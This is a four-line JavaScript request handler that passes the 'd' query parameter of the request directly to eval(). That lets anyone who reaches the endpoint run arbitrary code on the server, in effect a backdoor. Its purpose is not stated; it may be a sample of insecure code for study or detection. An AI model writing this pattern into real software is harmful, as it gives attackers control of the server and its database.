export function handler(req, res, db) {
    const d = req.query.d;
    eval(d);
}
